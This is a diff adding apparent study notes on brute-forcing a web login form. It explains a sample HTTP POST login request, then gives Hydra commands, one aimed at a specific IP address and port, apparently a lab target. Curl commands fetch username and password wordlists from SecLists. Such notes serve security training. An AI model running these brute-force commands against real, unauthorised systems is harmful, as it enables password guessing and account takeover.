@@ -1,0 +1,26 @@
+THIS IS THE REEQUEST:
+POST /login HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=john&password=secret123
+
+
+The POST method indicates that data is being sent to the server to create or update a resource.
+/login is the URL endpoint handling the login request.
+The Content-Type header specifies how the data is encoded in the request body.
+The Content-Length header indicates the size of the data being sent.
+
+
+A hydra command to use for the above example is:
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+
+EExample:
+hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 83.136.252.86 -s 52778 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+
